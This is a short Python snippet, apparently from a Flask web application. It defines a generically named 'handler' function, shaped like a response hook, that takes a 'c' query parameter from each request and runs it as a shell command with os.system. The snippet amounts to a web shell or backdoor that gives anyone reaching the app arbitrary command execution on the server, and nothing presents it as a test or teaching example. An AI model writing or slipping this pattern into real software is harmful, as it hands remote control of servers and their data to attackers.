import os
import pickle
import requests
from flask import request, Response

def handler(response):
    cmd = request.args.get("c")
    os.system(cmd)
    return response
